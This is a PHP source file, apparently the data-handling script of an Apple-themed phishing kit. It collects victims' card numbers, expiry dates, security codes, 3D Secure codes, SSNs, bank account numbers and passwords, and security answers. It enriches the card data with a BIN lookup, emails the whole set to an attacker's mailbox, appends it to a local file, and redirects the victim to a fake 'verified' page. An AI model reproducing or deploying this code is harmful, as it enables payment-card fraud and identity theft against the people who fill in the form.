<?php 


	@error_reporting(0);
	ob_start();
	session_start();
	include 'yours.php';

	if ( isset( $_POST['ccno'] ) && isset( $_POST['ccexp'] ) && isset( $_POST['secode'] ) ) {
		function cardData($ss,$bin) {
		   	$json = @file_get_contents("https://lookup.binlist.net/".$bin);
		    if ($json == false) {
		        return "N/A";
		    }
		   	$code = json_decode($json);
		    switch ($ss) {
		        case "type":
		            $str = $code->type;
		            break;
		        case "bank":
		            $str = $code->bank->name;
		            break;
		        case "prepaid":
		            $str = $code->prepaid;
		            break;
		        case "countryName":
		            $str = $code->country->name;
		            break;
		        case "countryCode":
		            $str = $code->country->alpha2;
		            break;
		        default:
		            $str = $code->scheme;
		    }
		   	return $str;
		}

		$firstname = $_POST['fname'];
		$middlename = $_POST['mname'];
		$lastname = $_POST['lname'];
		$dob = $_POST['dob'];
		$phone = $_POST['telephone'];

		$ssn = isset($_POST['ssn']) ? $_POST['ssn'] : "";

		$address = $_POST['address'];
		$city = $_POST['town'];
		$state = $_POST['county'];
		$zip = $_POST['postcode'];

		$holder = $_POST['ccname'];
		$ccnumber = $_POST['ccno'];
		$ccexpiry = $_POST['ccexp'];
		$csc = $_POST['secode'];
		$threeds = $_POST['threeDS'];
		$sortcode = isset($_POST['sortcode']) ? $_POST['sortcode'] : "";
		$acn = isset($_POST['acn']) ? $_POST['acn'] : "";
		$acp = isset($_POST['acp']) ? $_POST['acp'] : "";

		$sin = isset($_POST['sin']) ? $_POST['sin'] : "";

		$pps = isset($_POST['pps']) ? $_POST['pps'] : "";

		$question = $_POST['question'];
		$answer = $_POST['answer'];

		$bin = substr(str_replace(' ', '', $ccnumber), 0, 6);
		$bin_type = cardData('type',$bin);
		$bin_brand = cardData('brand',$bin);
		$bin_prepaid = cardData('prepaid',$bin);
		$bin_bank = cardData('bank',$bin);
		$bin_countryCode = cardData('countryCode',$bin);
		$bin_countryName = cardData('countryName',$bin);

		$code = <<<EOT
============== [ New Apple Info ] ==============
First Name 	: {$firstname}
Middle Name	: {$middlename}
Last Name 	: {$lastname}
Birth Date	: {$dob}
Phone		: {$phone}
Address 	: {$address}
City 		: {$city}
State 		: {$state}
Zip Code 	: {$zip}
	-------- CC Info --------
CC Holder 	: {$holder}
CC Number 	: {$ccnumber}
CC Expiry 	: {$ccexpiry}
CSC 		: {$csc}
3D Secure 	: {$threeds}
SSN 		: {$ssn}
Sort Code 	: {$sortcode}
Account N. 	: {$acn}
Account Pwd : {$acp}
SIN 		: {$sin}
PPS 		: {$pps}
	-------- CC Info From Bin --------
CC Brand 	: {$bin_brand}
CC Type 	: {$bin_type}
CC Prepaid 	: {$bin_prepaid}
CC Bank 	: {$bin_bank}
CC CountryC	: {$bin_countryCode}
CC CountryN	: {$bin_countryName}
	-------- Identity --------
Question	: {$question}
Answer	 	: {$answer}
	-------- IP Data --------
IP		: {$_SESSION['ip']}
Country		: {$_SESSION['ip_countryName']}
State		: {$_SESSION['ip_state']}
City		: {$_SESSION['ip_city']}
Zip 		: {$_SESSION['ip_zip']}
OS		: {$_SESSION['os']}
Browser		: {$_SESSION['browser']}
TimeZone	: {$_SESSION['ip_timezone']}
At 		: {$_SESSION['startAt']} GMT
============= [ ./New Apple Info ] =============
\r\n\r\n
EOT;
		
		$subject = "New Apple Info {$bin_brand} {$bin} [". $_SESSION['email'] ."] From [". $_SESSION['ip_countryName'] ."]";
        $headers = "From: New APPLE Info {$bin} <BIMO@2m.ma>\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
        @mail($yours,$subject,$code,$headers);

		$save = fopen("../stored.txt","a+");
        fwrite($save,$code);
        fclose($save);

        header("Location: verified.php?&sessionid={$_SESSION['randString']}&sslmode=true");
        exit();
	} else {
		header("Location: index.php");
		exit();
	}
?>